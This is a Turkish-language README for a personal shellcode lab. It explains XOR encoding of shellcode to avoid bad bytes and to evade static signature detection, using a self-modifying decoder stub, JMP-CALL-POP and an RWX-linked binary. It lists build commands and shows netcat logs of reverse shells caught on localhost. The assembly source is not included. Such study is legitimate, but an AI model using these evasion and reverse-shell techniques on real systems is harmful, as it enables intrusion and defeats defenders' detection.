# Lab 04: Shellcode Encoding & Self-Modifying Code (SMC)

Bu laboratuvar çalışmasında; payload transferinde kısıtlamalara yol açan yasaklı karakterlerden (bad characters) kaçınmak, statik tespit desenlerini kırmak ve çalışma zamanında kendi kendini deşifre eden **Self-Modifying Code (SMC)** mekanizmalarını incelemek amacıyla XOR tabanlı bir dekoder stub mimarisi geliştirilmiş ve test edilmiştir.

---

## 1. Encoding Neden Gereklidir?

### A. Yasaklı Karakterler (Bad Characters)
Bir shellcode hedef yazılıma enjekte edilirken (örneğin bir string kopyalama veya girdi alma fonksiyonu üzerinden), bazı baytlar akışı kesebilir veya veriyi bozabilir:
* `0x00` (Null Byte): `strcpy`, `strlen` gibi fonksiyonlarda string sonlandırıcı olarak kabul edilir.
* `0x0a` (`\n` - Line Feed) / `0x0d` (`\r` - Carriage Return): Ağ veya girdi fonksiyonlarında satır sonu kabul edilerek girdinin erken kesilmesine yol açabilir.

Encoding işlemi, bu tür kritik baytları maskeleyerek payload'un hedefe bozulmadan ulaşmasını sağlar.

### B. Statik Tespit Mekanizmaları
Statik analiz araçları ve imza tabanlı tespit kuralları (örn: YARA), bilinen opcode dizilimlerini tarayabilir. Payload'un encode edilmesi ve çalışma anında dinamik olarak çözülmesi (runtime decoding/fluctuation mantığı), statik imza eşleşmelerini analiz etme ve doğrulama süreçlerinde temel bir yaklaşımdır.

---

## 2. Düşük Seviyeli Mimari ve Zorluklar

### Self-Modifying Code (SMC) ve RWX Bellek İhtiyacı
Yazılan dekoder rutini, bellekteki şifreli baytları runtime sırasında okumalı, XOR işleminden geçirmeli ve **tekrar aynı bellek alanına yazmalıdır**.

```text
[ Bellek Alanı ]  -->  [ Oku (R) ]  -->  [ XOR Dekod ]  -->  [ Yaz (W) ]  -->  [ İcra Et (X) ]
```

Standart işletim sistemi korumalarında (DEP / NX) bir bellek segmenti genellikle ya yazılabilir (RW-) ya da çalıştırılabilir (R-X) olur; her iki yetkiye birden izin verilmez.

Bu laboratuvar kapsamında DEP kısıtlamasını laboratuvar ortamında simüle etmek ve kod segmentine aynı anda Okuma-Yazma-Çalıştırma izni vermek için bağlayıcıya (linker) `-N` (`--omagic`) parametresi geçilmiştir:

```bash
ld -N -m elf_i386 runner.o -o runner
# Uyarı: runner has a LOAD segment with RWX permissions
```

### JMP-CALL-POP Tekniği
32-bit x86 mimarisinde EIP (Instruction Pointer) doğrudan okunamaz. Kodun bellekteki dinamik adresini (PIC - Position Independent Code) bulmak için JMP-CALL-POP yaklaşımı kullanılır:

1. `JMP` ile payload'un hemen öncesindeki `CALL` komutuna atlanır.
2. `CALL` komutu çalıştığında, bir sonraki adres (yani şifreli shellcode'un başlangıç adresi) dönüş adresi olarak stack'e basılır.
3. Hedef fonksiyondaki `POP` komutu ile stack'teki bu adres bir register'a (ESI veya EBX) alınarak shellcode'un başlangıç konumu mutlak olarak elde edilir.

---

## 3. Derleme ve Çalıştırma Adımları

### A. Standart XOR Dekoder Runner
```bash
# 1. Assembly derleme
nasm -f elf32 runner.asm -o runner.o

# 2. RWX yetkili bağlama (Link)
ld -N -m elf_i386 runner.o -o runner

# 3. Çalıştırma
./runner
```

### B. İteratif Encoder Varyantları (SGN Runner & Mark II)
```bash
# SGN Runner Derleme & Bağlama
nasm -f elf32 sgn_runner.asm -o sgn_runner.o
ld -N -m elf_i386 sgn_runner.o -o sgn_runner
./sgn_runner

# SGN Runner Mark II Derleme & Bağlama
nasm -f elf32 sgn_runner_markII.asm -o sgn_runner_markII.o
ld -N -m elf_i386 sgn_runner_markII.o -o sgn_runner_markII
./sgn_runner_markII
```

---

## 4. Test ve Doğrulama (Execution Logs)

Netcat dinleyicisi üzerinde her bir encoder varyantının çalışma anında payload'u başarıyla çözüp tersine kabuk bağlantısını sağladığı doğrulanmıştır:

### Test 1: Temel Dekoder Runner Doğrulaması
```
ataberk@ataberkpc:~/shellcode0/linux-shc-lab/lab04-encoder$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 41532
whoami
ataberk
pwd
/home/ataberk/shellcode0/linux-shc-lab/lab04-encoder
```

### Test 2: SGN Runner Varyant Doğrulaması
```
ataberk@ataberkpc:~/shellcode0/linux-shc-lab/lab04-encoder$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 55380
whoami
ataberk
pwd
/home/ataberk/shellcode0/linux-shc-lab/lab04-encoder
```

### Test 3: SGN Runner Mark II Varyant Doğrulaması
```
ataberk@ataberkpc:~/shellcode0/linux-shc-lab/lab04-encoder$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 36080
whoami
ataberk
pwd
/home/ataberk/shellcode0/linux-shc-lab/lab04-encoder
```

---

## Dosya Yapısı

```
.
├── encoder.c               # Payload'u XOR tabanlı encode eden yardımcı C aracı
├── runner.asm              # JMP-CALL-POP ve XOR dekoder mantığını içeren Assembly stub
├── sgn_encoder.c           # Gelişmiş encoder implementasyonu
├── sgn_runner.asm          # Alternatif dekoder runner varyantı
├── sgn_runner_markII.asm   # Geliştirilmiş Mark II dekoder runner varyantı
└── poc.c                   # lab03 shc(önceki lab ile aynı.)
```
